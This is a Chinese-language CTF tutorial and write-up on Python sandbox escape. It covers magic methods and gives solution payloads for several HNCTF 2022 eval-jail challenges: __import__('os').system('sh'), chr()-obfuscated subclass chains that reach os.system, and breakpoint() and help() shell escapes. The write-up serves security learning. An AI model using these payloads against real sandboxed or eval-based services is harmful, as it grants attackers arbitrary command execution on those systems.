# 知识分享（[来源](https://zhuanlan.zhihu.com/p/578966149)）
python沙箱逃逸（pyjail），是CTF中一类题的通称：在这些题目中，我们能够交互式地用eval或者exec执行python代码。然而，执行的代码和上下文均受到一定限制，如题目用正则表达式拒绝部分字符的输入、以及令__builtins__=None等。在正式开始介绍pyjail题目的解法之前，让我们先复习一下python的一些特性：

- 在python中，类均继承自object基类；
- python中类本身具有一些静态方法，如bytes.fromhex、int.from_bytes等。对于这些类的实例，也能调用这些静态方法。如b'1'.fromhex('1234')，返回b'\x124'。（一个特殊的例子是整数常量不支持这样操作，如输入3.from_bytes会报错）
- python中的类还具有一系列的魔术方法，这个特性可以对比php的魔术方法，以及C++的运算符重载等。一些函数的实现也是直接调用魔术方法的。常用的魔术方法有这些，更多可参考[这里](https://link.zhihu.com/?target=https%3A//rszalski.github.io/magicmethods/)：
   - __init__：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。
   - __len__：返回对象的长度。对一个对象a使用len(a)时，会尝试调用a.__len__()。这个做炼丹的同学应该很熟悉，例如要通过继承torch.utils.data.Dataset来实现自己的数据集时，就需要实现这个方法；
   - __str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（print函数中也会自动调用对象的__str__方法）相似地，还有__int__魔术方法也用于类型转换，不过较少使用；
   - __getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。同样，当我们通过继承torch.utils.data.Dataset来实现自己的数据集时，就需要实现这个方法。有__getitem__，自然也有对应的__setitem__；
   - __add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现__radd__、__rsub__、__rmul__、__rdiv__、__rmod__，如椭圆曲线上的点的倍点运算G -> d * G，就可以通过实现__rmul__来实现。
   - __and__，__or__、__xor__：逻辑运算，和算术运算类似；
   - __eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' > '广西'，就会转而调用'贵州'.__gt__('广西')；
   - __getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__；
   - __subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现RCE。
- 相对应地，python的类中也包含着一些魔术属性：
   - __dict__：可以查看内部所有属性名和属性值组成的字典。譬如下面这段代码：
- 就能看到字典中包含'vivo': 50的键值对。**注意在python中，dict()是将类转成字典的函数，跟此魔术属性无关。**
   - __doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
```
class KFCCrazyThursday:
    vivo = 50

print(KFCCrazyThursday.__dict__)
```
```
class KFCCrazyThursday:
    '''
    And you broke up for seven years, you still can affect my mood, I still keep our photo, remember your birthday, OK? I have countless times to find your impulse, But still hold back, this message I do not block you, because I am your forever blacklist, but I love you, from the past to the present, a full love of you for eight years, But now I'm not sad, because I have no idea who wrote this or who this girl is, and I just want to tell you by the way: Today is Crazy Thursday, I want to eat KFC
    '''
    vivo = 50

print(KFCCrazyThursday.__doc__)
```
就会打印上面的文档；

      - __class__：返回当前对象所属的类。如''.__class__会返回<class 'str'>。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'；
      - __base__：返回当前类的基类。如str.__base__会返回<class 'object'>；
- 以及还有一些重要的内置函数和变量：
   - dir：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过getattr来拿到目标方法。
   - chr、ord：字符与ASCII码转换函数，能帮我们绕过一些WAF
   - globals：返回所有全局变量的函数；
   - locals：返回所有局部变量的函数；
   - __import__：载入模块的函数。例如import os等价于os = __import__('os')；
   - __name__：该变量指示当前运行环境位于哪个模块中。如我们python一般写的if __name__ == '__main__':，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那__name__就不为__main__，就不会执行之后的代码。更多参考[这里](https://link.zhihu.com/?target=https%3A//www.geeksforgeeks.org/__name__-a-special-variable-in-python/)；
   - __builtins__：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如str、chr、ord、dict、dir等。在pyjail的沙箱中，往往__builtins__被置为None，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到__builtins__，再__import__('os').system('sh')进行RCE；
   - __file__：该变量指示当前运行代码所在路径。如open(__file__).read()就是读取当前运行的python文件代码。需要注意的是，**该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量**；
   - _：该变量返回上一次运行的python语句结果。需要注意的是，**该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量**。

做这些题目的时候，思路一定要广。pyjail和web中命令执行的WAF绕过、SSTI、SQL注入等联系紧密，可以借鉴这些问题的解决思路。下面提一下一些一般的思路：

- 肯定优先考虑RCE。RCE的起手式一种是os.system('sh')进交互式终端，另一种是SSTI这种无交互式终端问题中较常用的os.popen('ls').read()（_能RCE了为啥不直接弹shell呢……_），当然subprocess.popen也能做RCE；
- RCE的两种方法前面长篇大论已经提到了一些，这里再整理一下：一种是在object.__subclasses__()中找到os模块中的类（一般是<class 'os._wrap_close'>），另一种是先拿到__builtins__，再__import__('os').system('sh')。
- RCE的payload模板可以通过chrome中hackbar插件SSTI的Show subclasses with tuple拿到；
- 利用第一种方法时，注意本地环境和远程环境中os模块中的类的索引（偏移量）可能不相同；
- 用好python的函数，尤其是chr、getattr、dir来绕WAF；
- 类型转换：此处主要是bytes和str的类型转换。首先bytes可以通过可迭代的对象，如tuple和list来初始化，如bytes([99, 108, 101, 97, 114, 108, 111, 118, 101, 55])为b'clearlove7'；然后再通过decode方法转为str；
- Non-ASCII Identifiers：在python3中支持Non-ASCII Identifies并且所有都会被转换成unicode的NFKC（也就是标准模式）。我们可以用斜体或者花体各种各样的与标准字母相像的来进行导包操作。更多参考[这里](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/9271)；
- 如果不能RCE，可以通过一些侧信道的方法读flag，或者猜解flag。如有回显时类似SQL盲注的手法，无回显时类似SQL时间盲注的手法；
- **站在巨人的肩膀上**：如果真的没有任何思路的时候，建议先去搜索国内外已有CTF的writeup，并学习、对照着改出一份payload来。
# 本周重点
## 1.[HNCTF 2022 Week1]calc_jail_beginner(JAIL)
```
#Your goal is to read ./flag.txt
#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`

WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
print('Answer: {}'.format(eval(input_data)))

```
题目第二行给了payload
```
 payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`
```
我们用get交互shell
```
__import__('os').system('sh')
```
![6da128ec06e4f9679f245421c8365b2e.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701773099241-5b1b4a6c-4cb2-4e53-8156-3280bb5dda03.png#averageHue=%23252832&clientId=ufe48b559-574f-4&from=paste&height=277&id=u2bb8b295&originHeight=347&originWidth=583&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108979&status=done&style=none&taskId=u4659cf95-bd8c-4c70-bc1a-f1e405e6766&title=&width=466)
## 2.[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)
```
#the function of filter will banned some string ',",i,b
#it seems banned some payload 
#Can u escape it?Good luck!

def filter(s):
    not_allowed = set('"\'`ib')
    return any(c in not_allowed for c in s)

WELCOME = '''
  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))

```
过滤了" ' i b \
所以import、__builtins__、bytes都用不了，尝试
```
__class__.__base__.__subclassser__()
```
但b被ban了，所以用getattr
```
getattr(().__class__,'__base__').__subclasses__()
```
但' 被ban了，用chr函数和字符串拼接绕过
![f097bfd1d34b5a55d62bf476f7c771a3.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701775432614-e01b26f4-8b8f-4b28-9c2d-e77d8bf37cc9.png#averageHue=%231b252f&clientId=ufe48b559-574f-4&from=paste&height=182&id=ub0805d5c&originHeight=227&originWidth=268&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1782&status=done&style=none&taskId=u86d2ff2c-da89-41fa-a486-fe4b5b3eabf&title=&width=214.4)
```
chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)
```
新的payload
```
getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()
```
然后subclasses也有b被ban了
同样绕过
```
getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
```
得到所有子类
```
┌──(root㉿dmw)-[~]
└─# nc node5.anna.nssctf.cn 28576

  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
> getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
Answer: [<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]

```
找到倒数第四个类是<class 'os._wrap_close'>，payload
```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh')
```
绕过__init__和__globals__
```
getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))
```
get shell
![039e102b0e9803da9a16d4bb19c96d67.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701776495542-20683258-0e02-47ad-9946-6d7428635e47.png#averageHue=%23242833&clientId=ufe48b559-574f-4&from=paste&height=446&id=ueb7c6aa7&originHeight=557&originWidth=636&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146971&status=done&style=none&taskId=u295697c2-425a-4d2c-b0ba-c36beade68a&title=&width=509)
另解
当然这里因为eval出的结果是有回显的，所以我们也可以通过上面那个open('flag').read()的，但是得猜flag文件名
```
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```
![19380bdc8482864e2ef23f751e14e4c9.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701776838603-57636b6d-a0fb-4895-a2e9-8e9c791df831.png#averageHue=%23262b38&clientId=ufe48b559-574f-4&from=paste&height=56&id=ua01fd847&originHeight=70&originWidth=488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16620&status=done&style=none&taskId=u5292311a-cb75-497b-9165-7c3fc285659&title=&width=390.4)
## 3.[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)
```
#the length is be limited less than 13
#it seems banned some payload 
#Can u escape it?Good luck!

WELCOME = '''
  _                _                           _       _ _   _                _ ___  
 | |              (_)                         (_)     (_) | | |              | |__ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ 
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|
              __/ |                          _/ |                                    
             |___/                          |__/                                                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))

```
限制了payload长度不能超过13
但是在php命令执行中，存在一种参数逃逸
```
/?cmd=system($_POST[1]);&1=ls
```
把system中的参数逃逸到GET参数的1中去。这里我们也是一样，再往里面套一层：
```
eval(input())
```
然后输payload就可以get shell
![3cc24690bde3cd2f1cc258e20a684d66.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701777241745-2009164a-6409-446a-9d26-8c7b48488d6f.png#averageHue=%23242834&clientId=ufe48b559-574f-4&from=paste&height=108&id=ucca22104&originHeight=135&originWidth=477&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26432&status=done&style=none&taskId=ucccabffb-4abf-4462-8430-8499de1c041&title=&width=381.6)
## 4.[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)
```
#the length is be limited less than 13
#it seems banned some payload 
#banned some unintend sol
#Can u escape it?Good luck!

def filter(s):
    BLACKLIST = ["exec","input","eval"]
    for i in BLACKLIST:
        if i in s:
            print(f'{i!r} has been banned for security reasons')
            exit(0)

WELCOME = '''
  _                _                           _       _ _ _                _ ___    _____ 
 | |              (_)                         (_)     (_) | |              | |__ \  | ____|
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ 
              __/ |                          _/ |                                          
             |___/                          |__/                                                                                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
filter(input_data)
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))

```
好像和上一个题目差不多，一样限制长度了不大于13，但是多了个breakpoint可以用
```
breakpoint()
```
进入pdb
> pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。

所以说进到了Pdb里面去之后，就能用一句话RCE了
![0f1059c5375c213df5d218cb27de489a.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701779572795-bf8ae5ea-8628-4edf-8b62-e88b913f3f3e.png#averageHue=%23242834&clientId=u3f20ad58-3a8a-4&from=paste&height=136&id=u97eec07e&originHeight=170&originWidth=475&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35229&status=done&style=none&taskId=u0cae2ffb-01fc-4a3d-9840-8fdb38e1ff2&title=&width=380)
## 5.[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)
```
#!/usr/bin/env python3
WELCOME = '''
  _                _                           _       _ _   _                _ ____  
 | |              (_)                         (_)     (_) | | |              | |___ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ < 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ 
              __/ |                          _/ |                                     
             |___/                          |__/                                                                                       
'''

print(WELCOME)
#the length is be limited less than 7
#it seems banned some payload 
#Can u escape it?Good luck!
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data)>7:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))


```
和2附件一样但是限制字符长度为7了
在python交互式终端中，可以通过help函数来进行RCE
输入help()，进入到help界面，然后随便找个模块，例如os输入，此时就会显示os模块的帮助页面，输入!sh就能进到shell里面去。
![71f913f89efb5c94ab7d7c6bb8667f3c.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701780337394-eff428ab-9a90-4b61-84d7-8e7ad0a4e6af.png#averageHue=%23252934&clientId=u3f20ad58-3a8a-4&from=paste&height=628&id=u34f4b12a&originHeight=785&originWidth=607&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=240997&status=done&style=none&taskId=uf0079e03-41cb-4785-b7c0-bf1089f2112&title=&width=485.6)
# 其他pyjail题
## 1.[HNCTF 2022 Week1]python2 input(JAIL)
```
# It's escape this repeat!

WELCOME = '''
              _   _      ___        ___    _____             _    _ _   
             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
 | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |               
 |_|    |___/                                         |_|                               
'''

print WELCOME

print "Welcome to the python jail"
print "But this program will repeat your messages"
input_data = input("> ")
print input_data

```
直接一把嗦
![5f28670a14f596f1c1787dbed4ca0c15.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701780977108-68b0f532-50bf-43ee-bde2-d7897f69eefe.png#averageHue=%23242834&clientId=u3f20ad58-3a8a-4&from=paste&height=129&id=u9f917fbf&originHeight=161&originWidth=453&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28638&status=done&style=none&taskId=ua03b3d3c-530b-4d16-8868-8bb69914330&title=&width=362.4)
## 2.[HNCTF 2022 Week1]lake lake lake(JAIL)
```
#it seems have a backdoor
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>9):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
 | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)

```
因为这个key变量是个全局变量，所以便可以用globals()来泄露所有全局变量的值。之后就直接把key的值输入进去之后，就可以一句话RCE。
![68346a52fbf6b514412a5fe00fe0736d.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701781287499-d2ba4813-0c9b-45a3-9fd4-0e287c1bf80a.png#averageHue=%23242732&clientId=u3f20ad58-3a8a-4&from=paste&height=126&id=ufb719949&originHeight=158&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117235&status=done&style=none&taskId=uac775434-6773-40da-9e78-b571ccc3b89&title=&width=1528.8)
![1098e82759545689b96ca8536fe99052.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701781362404-df2164d0-bfa8-4f78-83bc-9a1a23c6ec44.png#averageHue=%23242834&clientId=u3f20ad58-3a8a-4&from=paste&height=161&id=u657fa932&originHeight=201&originWidth=429&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39044&status=done&style=none&taskId=u2e0f91f1-ba0c-4840-800b-654d99d6ff4&title=&width=343.2)
## 3.[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)
```
#it seems have a backdoor as `lake lake lake`
#but it seems be limited!
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>6):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _         _          _         _          _         _        
 | |  ____ | |        | |  ____ | |        | |  ____ | |       
 | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ 
 | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \
 | | | (_| |   <  __/ | | | (_| |   <  __/ | | | (_| |   <  __/
 |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
     \____/               \____/               \____/                                                                                                                                                                                                                                        
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)

```
payload长度被限制到了6，我们看来又只能用help()函数了。但是我们在操作的时候，发现!sh不能进到shell里面。
![4006cf0cf9930a9500fdd317bb1ebc0e.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701781550620-d3f6754f-cc2d-45ee-ac80-7b98f626e4da.png#averageHue=%23242834&clientId=u3f20ad58-3a8a-4&from=paste&height=589&id=u90710638&originHeight=736&originWidth=675&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=238073&status=done&style=none&taskId=u6c63fe6e-960b-4011-8788-2d9ec949619&title=&width=540)
看了下help的第一句话：
> Enter the name of any module, keyword, or topic to get help on writing
> Python programs and using Python modules.  To quit this help utility and
> return to the interpreter, just type "quit".
> 
> To get a list of available modules, keywords, symbols, or topics, type
> "modules", "keywords", "symbols", or "topics".  Each module also comes
> with a one-line summary of what it does; to list the modules whose name
> or summary contain a given string such as "spam", type "modules spam".

所以重点在Enter the name of any module, keyword, or topic上。我们之前输入os得到os模块的帮助，那么我们如果输入__main__的话，是不是得到当前模块的帮助？答案是肯定的：我们输入__main__之后，就返回了当前模块的信息，包括全局变量：
![3bfce3393812c202f52ea1a5072cc8f0.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701781739143-8aeffc0b-4705-4f89-a29e-b4af2d71363b.png#averageHue=%23232732&clientId=u3f20ad58-3a8a-4&from=paste&height=570&id=u139f5557&originHeight=713&originWidth=665&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191268&status=done&style=none&taskId=u77489081-dcb8-4b72-bac0-65544a3495f&title=&width=532)
接着就可以一句话rce了
